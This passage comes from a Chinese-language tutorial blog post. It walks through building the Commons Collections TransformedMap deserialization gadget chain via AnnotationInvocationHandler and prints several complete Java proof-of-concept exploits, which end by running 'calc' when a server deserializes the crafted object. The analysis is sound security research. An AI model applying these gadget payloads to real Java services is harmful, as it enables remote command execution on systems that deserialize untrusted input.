<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">put</span><span class="params">(Object key, Object value)</span> &#123;<span class="comment">//如果使用了put方法，那么就会执行transform方法</span></span><br><span class="line">    key = <span class="built_in">this</span>.transformKey(key);<span class="comment">//这里调用了我们想要调用的方法</span></span><br><span class="line">    value = <span class="built_in">this</span>.transformValue(value);<span class="comment">//这里调用了我们想要调用的方法</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getMap().put(key, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那<code>keyTransformer</code>和<code>valueTransformer</code>可控吗？</p>
<p><code>TransformedMap</code>类中的constructor传入两个转换链，一个是<code>keyTransformer</code>一个是<code>valueTransformer</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(map);</span><br><span class="line">    <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">    <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而它的<code>decorate()</code>静态方法会返回新的<code>TransformedMap</code>实例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们可以利用<code>TransformedMap.decorate()</code>来获取到一个新的<code>TransformedMap Instance</code></p>
<p><strong>POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//final malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(myMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">mapObj</span> <span class="operator">=</span> (Map) objectInputStream.readObject();</span><br><span class="line">        <span class="comment">//触发漏洞</span></span><br><span class="line">        mapObj.put(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;bb&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>计算器成功弹出！</p>
<p>现在范围扩大了，因为我们用到了更为常见的Map和<code>put()</code>触发。</p>
<p>我们更理想化的攻击方式是，服务器端只要反序列化<code>readObject()</code>就能触发反序列化漏洞。可惜的是，安全研究的前辈们发现并未有【重写了<code>readObject()</code>方法且方法内可以调用<code>MapObj.put()</code>方法】的Class。</p>
<h4 id="第五步：TransformedMap-checkSetValue"><a href="#第五步：TransformedMap-checkSetValue" class="headerlink" title="第五步：TransformedMap - checkSetValue()"></a>第五步：TransformedMap - checkSetValue()</h4><p>还记得第四步的时候，我们在<code>TransformedMap</code>类中还发现了一个方法，但<strong>并未利用</strong>吗？</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>既然<code>put()</code>不可以再进一步利用了，这个方法会不会有更多利用空间呢？<code>TransformedMap</code>类继承了<code>AbstractInputCheckedMapDecorator</code>类，我们跟进去看一下。搜索<code>checkSetValue()</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222403673.png" alt="image-20210731222403673"></p>
<p>这里<code>MapEntry</code>里出现了<code>checkSetValue()</code>，那我们只要保证<code>this.parent</code>是指向<code>TransformedMap</code>类的对象就可以了。</p>
<p>我们看看<code>this.parent</code>都在哪些地方可以被赋值呢？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731222703200.png" alt="image-20210731222703200"></p>
<p>分别是在<code>EntrySetIterator</code>和<code>EntrySet</code>的<code>constructor</code>里可以被赋值！但这是<strong>不同</strong>Class的<code>parent</code>，我们需要的是<code>MapEntry</code>里的<code>parent</code>，继续查看代码，发现：<code>EntrySetIterator</code>中的next()方法会将自身的<code>parent</code>传入<code>MapEntry</code>，而<code>EntrySet</code>的<code>iterator</code>方法又会创建一个新的<code>EntrySetIterator</code>，将它的parent传入<code>EntrySetIterator</code>，这样就连起来了 - <code>new EntrySet(set,parent).iterator().next()</code>就能够传入我们的parent。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731223154142.png" alt="image-20210731223154142"></p>
<p>接着我们发现，<code>AbstractInputCheckedMapDecorator</code>里还有一个<code>entrySet()</code>，因为我们的<code>TransformedMap</code>就是它的子类，所以我们可以直接用我们的<code>TransformedMap</code>去call这个method,一切就连起来了。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Set <span class="title function_">entrySet</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (Set)(<span class="built_in">this</span>.isSetValueChecking() ? <span class="keyword">new</span> <span class="title class_">AbstractInputCheckedMapDecorator</span>.EntrySet(<span class="built_in">super</span>.map.entrySet(), <span class="built_in">this</span>) : <span class="built_in">super</span>.map.entrySet());<span class="comment">//这里会创建一个新的entrySet，把自身作为parent传入constructor</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">finalMap</span> <span class="operator">=</span> (Map.Entry) myMap.entrySet().iterator().next();<span class="comment">//传入parent</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(finalMap);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) objectInputStream.readObject();</span><br><span class="line">        entry.setValue(<span class="string">&quot;leihehe&quot;</span>);<span class="comment">//触发漏洞</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>原本以为成功了，结果发现：<code>MapEntry</code>不能被序列化<img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225703306.png" alt="image-20210731225703306"></p>
<p>去掉序列化和反序列化过程，成功弹出计算器</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731225956030.png" alt="image-20210731225956030"></p>
<h4 id="第六步：-AnnotationInvocationHandler"><a href="#第六步：-AnnotationInvocationHandler" class="headerlink" title="第六步： AnnotationInvocationHandler"></a>第六步： AnnotationInvocationHandler</h4><p>虽然在第五步我们不能序列化，但幸运的是<code>AnnotationInvocationHandler</code>中出现了我们想要的内容：</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731220804329.png" alt="image-20210731220804329"></p>
<p><code>AnnotationInvocationHandler</code>拥有自己的<code>readObject()</code>方法，且方法中涉及到了<code>Map</code>的操作，让我们来详细分析一下。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        var1.defaultReadObject();</span><br><span class="line">        <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="comment">//var2代表AnnotationType（注释类型） -》 为空</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个实例</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">        <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();<span class="comment">//*****var4会直接将memberValues自身作为parent传入，和第五步我们自己构造的一模一样！！！如果没看懂的，建议看第五步仔细阅读。</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(var4.hasNext()) &#123;<span class="comment">//如果var4中还有下一个key-Value对</span></span><br><span class="line">            <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个key-value对，并赋值给var5</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">            <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">            <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;<span class="comment">//如果var3中有这个key</span></span><br><span class="line">                <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">                <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                    <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，call var5(Map)的setValue()方法</span></span><br><span class="line">                    var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>我们看到了熟悉的<code>this.memberValues.entrySet().iterator();</code>，在后面还有<code>setValue()</code>，这已经足够我们利用了。</p>
<p>上面代码<code>comment</code>中的<code>【this.type】</code>和<code>【this.memberValues】</code>都是可控的 -》 在constructor中可以传入。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">    Class[] var3 = var1.getInterfaces();</span><br><span class="line">    <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">        <span class="built_in">this</span>.type = var1;</span><br><span class="line">        <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>memberValues</code>我们赋值为<code>TransformedMap.decorate()</code>的返回值，那<code>type</code>呢？我们可以发现<code>type</code>是一种<code>Annotation</code>（注释），如果有同学用过<code>SpringBoot或Spring</code>的话，就会理解<code>Annotation</code>的意义。所以此处我们是要传一个Annotation的Class过去。再看<code>readObject()</code>中的逻辑：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">          ...</span><br><span class="line">var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);<span class="comment">//根据【this.type】给var2赋值为一个Annotation实例（实际会获取到注解的各种属性，包括注解元素，注解元素的默认值，生命周期，是否继承等等。）</span></span><br><span class="line">      <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();<span class="comment">//var3为var2 Annotation中的[value:ElementType]</span></span><br><span class="line">      <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">          <span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Entry)var4.next(); <span class="comment">//获取下一个entry</span></span><br><span class="line">          <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();<span class="comment">//获取var5的key</span></span><br><span class="line">          <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);<span class="comment">//在var3 memberTypes中查看有没有这个key，把结果赋值给var7</span></span><br><span class="line">          <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;<span class="comment">//如果var3 memberTypes中有这个key</span></span><br><span class="line">              <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();<span class="comment">//获取这个key-Value对中的value</span></span><br><span class="line">              <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                  <span class="comment">//*****如果var7不是var8（value）的实例，而且 value不是ExceptionProxy的实例，触发漏洞</span></span><br><span class="line">                  var5.setValue((<span class="keyword">new</span> <span class="title class_">AnnotationTypeMismatchExceptionProxy</span>(var8.getClass() + <span class="string">&quot;[&quot;</span> + var8 + <span class="string">&quot;]&quot;</span>)).setMember((Method)var2.members().get(var6)));</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>

<p>我们传入的这个type需要有<code>memberTypes</code>，且我们的<strong>map</strong>中的key必须要和<code>memberTypes</code>的key保持<strong>一致。</strong></p>
<p>跟踪<code>Annotation</code>这个<code>Class</code>，我们可以发现所有<code>Annotation</code>的<code>class。</code></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731231645279.png" alt="image-20210731231645279"></p>
<p>这里我们可以简单分析一下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Target &#123;</span><br><span class="line">    ElementType[] value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处<code>Target</code>的<code>memberTypes</code>就是 <code>[value:ElementType]</code> =》 <strong>key-value</strong>的形式。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Documented</span></span><br><span class="line"><span class="meta">@Retention(RetentionPolicy.RUNTIME)</span></span><br><span class="line"><span class="meta">@Target(ElementType.ANNOTATION_TYPE)</span></span><br><span class="line"><span class="keyword">public</span> <span class="meta">@interface</span> Retention &#123;</span><br><span class="line">    RetentionPolicy <span class="title function_">value</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处<code>Retention</code>的<code>memberTypes</code>就是 <code>[value:RetentionPolicy]</code> =》 <strong>key-value</strong>的形式`。</p>
<p>这些<code>Annotation</code>的元注解都可以通过<code>@</code>符号来调用，例如<code>@Target</code><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20210731232549977.png" alt="image-20210731232549977"></p>
<p>因此我们可以选择传入<code>Target.class</code>或者<code>Retention.class</code>, <code>map</code>的<code>key</code>值为<code>value</code>。</p>
<h4 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformedMapExploit</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, IOException, InstantiationException &#123;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 客户端构造payload，并序列化文件</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),<span class="comment">//返回Runtime Class</span></span><br><span class="line">                <span class="comment">//获取getRuntime方法</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getDeclaredMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//call getRuntime方法得到Runtime实例</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="comment">//创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法</span></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;anyContent&quot;</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">myMap</span> <span class="operator">=</span> TransformedMap.decorate(map, <span class="literal">null</span>, chainedTransformer);<span class="comment">//malicious map</span></span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; aClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<span class="comment">//反射获取该类</span></span><br><span class="line">        Constructor&lt;?&gt; aConstructor = aClass.getDeclaredConstructor(Class.class, Map.class);<span class="comment">//获取构造方法</span></span><br><span class="line">        aConstructor.setAccessible(<span class="literal">true</span>);<span class="comment">//取消构造方法限制</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> aConstructor.newInstance(Target.class, myMap);<span class="comment">//传入参数和malicious map</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化</span></span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        fileOutputStream.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">        * 服务端反序列化读取，并触发漏洞</span></span><br><span class="line"><span class="comment">        * */</span></span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;tm.cer&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        objectInputStream.readObject();<span class="comment">//触发漏洞</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>成功弹出计算器，这样服务端只需要<code>readObject()</code>即可触发反序列化漏洞了！</p>
<h3 id="LazyMap版本-POC构造过程-CommonsCollections-1"><a href="#LazyMap版本-POC构造过程-CommonsCollections-1" class="headerlink" title="LazyMap版本 - POC构造过程(CommonsCollections 1)"></a>LazyMap版本 - POC构造过程(CommonsCollections 1)</h3><h4 id="Intro-1"><a href="#Intro-1" class="headerlink" title="Intro"></a>Intro</h4><p>第一步到第三步和<code>TransformedMap</code>版本都是一模一样的，主要问题在于如何call到<code>ChainedTrasnformer.transform()</code></p>
<p>剩下的步骤和cc3的LazyMap、AnnotationInvocationHandler、动态代理一模一样，<a href="#lazyMap">点这里看</a></p>
